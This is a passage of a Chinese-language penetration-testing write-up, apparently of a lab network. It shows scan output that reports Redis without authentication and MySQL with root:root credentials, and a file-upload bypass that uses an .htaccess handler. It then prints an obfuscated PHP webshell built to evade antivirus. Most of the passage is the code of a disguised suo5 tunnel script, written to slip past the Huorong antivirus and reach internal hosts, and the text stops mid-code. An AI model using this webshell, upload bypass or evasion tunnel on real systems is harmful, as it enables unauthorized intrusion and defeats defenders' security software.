infoscan</span><br><span class="line">(icmp) Target 192.168.80.50   is alive</span><br><span class="line">(icmp) Target 192.168.80.55   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">192.168.80.50:22 open</span><br><span class="line">192.168.80.55:139 open</span><br><span class="line">192.168.80.55:135 open</span><br><span class="line">192.168.80.55:80 open</span><br><span class="line">192.168.80.50:80 open</span><br><span class="line">192.168.80.50:6379 open</span><br><span class="line">192.168.80.50:3306 open</span><br><span class="line">192.168.80.55:445 open</span><br><span class="line">192.168.80.50:18088 open</span><br><span class="line">192.168.80.50:18080 open</span><br><span class="line">[*] alive ports len is: 10</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://192.168.80.50      code:200 len:9483   title:None</span><br><span class="line">[*] NetBios 192.168.80.55   WORKGROUP\WIN-P5VV23D2I7P           Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[*] WebTitle http://192.168.80.55      code:200 len:11     title:None</span><br><span class="line">[*] OsInfo 192.168.80.55        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle http://192.168.80.50:18088 code:404 len:682    title:HTTP Status 404 – Not Found</span><br><span class="line">[+] mysql 192.168.80.50:3306:root root</span><br><span class="line">[*] WebTitle http://192.168.80.50:18080 code:200 len:1120   title:DocToolkit</span><br><span class="line">[+] Redis 192.168.80.50:6379 unauthorized file:/data/dump.rdb</span><br></pre></td></tr></table></figure>

<p>成功挂入内网：</p>
<img src="/posts/55d580db/image-20241211151247585.png" class="" title="image-20241211151247585">对其进行一手目录扫描：将扫描结果导出excel表格，发现敏感路径：/web.php

<img src="/posts/55d580db/image-20241211155214313.png" class="" title="image-20241211155214313">

<p>这是一个文件上传的点：</p>
<img src="/posts/55d580db/image-20241211165843878.png" class="" title="image-20241211165843878">

<p>经过一番测试，其是黑名单限制，不准许php后缀文件上传，并且对文件内容有限制，限制了一些敏感函数之类。</p>
<p>尝试上传<code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;a.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>



<p>尝试免杀webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$$b</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$c</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之所以利用<code>$_GET[&#39;id&#39;]</code>，是你利用<code>assert($_POST[1])</code>是无法直接利用蚁剑连接，它的是<code>eval($_POST[1])</code>才可以直接利用蚁剑连接。于是我直接利用<code>assert($_GET[&#39;id&#39;])</code>做一个转接口就可以成功连接蚁剑：如下</p>
<img src="/posts/55d580db/image-20241211212711628.png" class="" title="image-20241211212711628">

<p>挂上代理成功连接！</p>
<p>查询其相关进程：</p>
<img src="/posts/55d580db/image-20241211214223486.png" class="" title="image-20241211214223486">

<p>发现开启了火绒环境！</p>
<p>在这一层我一开始的是尝试用的<code>venom</code>来搭建多级代理的，但是很显然直接，被kill掉了，我看别的师傅的wp是通过传入<code>stowaway</code>来搭建的多级代理，我觉得可能是因为其一直维护到现在，相对来说比较新火绒没有对其进行拦截kill，但是这里我是通过<strong>免杀suo5</strong>直接搭建隧道到<code>192.168.81.22</code>网段。</p>
<p>免杀代码如下：</p>
<p><code>suo.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_PARSE);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_fopen&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;always_populate_raw_post_data&#x27;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bypass session lock</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.use_only_cookies&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.use_cookies&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.use_trans_sid&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.cache_limiter&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_id</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSID&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="title function_ invoke__">session_id</span>());</span><br><span class="line">    <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// disable output buffering</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;zlib.output_compression&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_implicit_flush</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">ob_get_level</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;5.4.0&#x27;</span>, <span class="string">&#x27;&gt;=&#x27;</span>)) @<span class="title function_ invoke__">http_response_code</span>(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlpassxpukcLmU</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ua</span> = <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ua</span> != <span class="string">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>] == <span class="string">&#x27;application/plain&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$read_data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>, <span class="number">0</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$read_data</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlpassOEgojXTR</span>(<span class="params"><span class="variable">$client_id</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$exist</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$client_id</span> . <span class="string">&#x27;_ok&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$exist</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="variable">$client_id</span> . <span class="string">&#x27;_buf&#x27;</span>] .= <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$exist</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlpassHvUNfPam</span>(<span class="params"><span class="variable">$client_id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$client_id</span> . <span class="string">&#x27;_ok&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="variable">$client_id</span> . <span class="string">&#x27;_ok&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlpassCgPzfQOO</span>(<span class="params"><span class="variable">$client_id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$client_id</span> . <span class="string">&#x27;_buf&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$client_id</span> . <span class="string">&#x27;_ok&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlpassEtbOsRDk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$data_map</span> = <span class="title function_ invoke__">xlpassxZHdjSBv</span>(<span class="variable">$body</span>);</span><br><span class="line">    <span class="variable">$client_id</span> = <span class="variable">$data_map</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$actions</span> = <span class="variable">$data_map</span>[<span class="string">&#x27;ac&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$actions</span>) != <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="variable">$action</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$actions</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="number">0x02</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">xlpassHvUNfPam</span>(<span class="variable">$client_id</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> == <span class="number">0x01</span>) &#123;</span><br><span class="line">        <span class="variable">$exist</span> = <span class="title function_ invoke__">xlpassOEgojXTR</span>(<span class="variable">$client_id</span>, <span class="variable">$data_map</span>[<span class="string">&#x27;dt&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$exist</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">xlpassGSuTOKsO</span>(<span class="title function_ invoke__">new_del</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$action</span> != <span class="number">0x00</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-Accel-Buffering: no&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Connection: Keep-Alive&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$data_map</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$port_str</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$data_map</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$port_str</span> == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$port_str</span> = <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] : <span class="string">&#x27;80&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$port</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$port_str</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$remote_sock</span> = @<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$remote_sock</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$remote_sock</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">//        ignore_user_abort(true);</span></span><br><span class="line">        <span class="variable">$read_from</span> = <span class="variable">$remote_sock</span>;</span><br><span class="line">        <span class="title function_ invoke__">xlpassCgPzfQOO</span>(<span class="variable">$client_id</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">xlpassGSuTOKsO</span>(<span class="title function_ invoke__">new_status</span>(<span class="number">0x00</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">xlpassGSuTOKsO</span>(<span class="title function_ invoke__">new_status</span>(<span class="number">0x01</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ok_key</span> = <span class="variable">$client_id</span> . <span class="string">&#x27;_ok&#x27;</span>;</span><br><span class="line">    <span class="variable">$buf_key</span> = <span class="variable">$client_id</span> . <span class="string">&#x27;_buf&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$last_buf_time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$read_from</span>)) &#123;</span><br><span class="line">        <span class="variable">$remote_data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$read_from</span>, <span class="number">32</span> * <span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remote_data</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$remote_data</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">xlpassGSuTOKsO</span>(<span class="title function_ invoke__">new_data</span>(<span class="variable">$remote_data</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$ok_key</span>]) || <span class="variable">$_SESSION</span>[<span class="variable">$ok_key</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$ok_key</span>]);</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$buf_key</span>]);</span><br><span class="line">            <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_SESSION</span>[<span class="variable">$buf_key</span>]) !== <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$last_buf_time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$read_from</span>, <span class="variable">$_SESSION</span>[<span class="variable">$buf_key</span>]);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$buf_key</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compute client count</span></span><br><span class="line">        <span class="variable">$client_count</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, -<span class="number">3</span>) == <span class="string">&#x27;_ok&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$client_count</span>++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() - <span class="variable">$last_buf_time</span> &gt; <span class="number">60</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">50000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$ok_key</span>]);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$buf_key</span>]);</span><br><span class="line">    <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$read_from</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">xlpassGSuTOKsO</span>(<span class="title function_ invoke__">new_del</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlpassGSuTOKsO</span>(<span class="params"><span class="variable">$m</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$buf</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$m</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$buf</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)) . <span class="variable">$key</span> . <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;N&#x27;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>)) . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$xor_key</span> = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$buf</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$buf</span>[<span class="variable">$i</span>]) ^ <span class="title function_ invoke__">ord</span>(<span class="variable">$xor_key</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;N&#x27;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>)) . <span class="variable">$xor_key</span> . <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlpassxZHdjSBv</span>(<span class="params"><span class="variable">$body</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;N&#x27;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$body</span>, <span class="number">0</span>, <span class="number">4</span>))[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$xor</span> = <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$body</span>, <span class="number">4</span>, <span class="number">1</span>));</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$body</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$len</span> &gt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;invalid len&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) != <span class="variable">$len</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;invalid data&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decoded</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$decoded</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) ^ <span class="variable">$xor</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$decoded</span>) - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$k_len</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$decoded</span>[<span 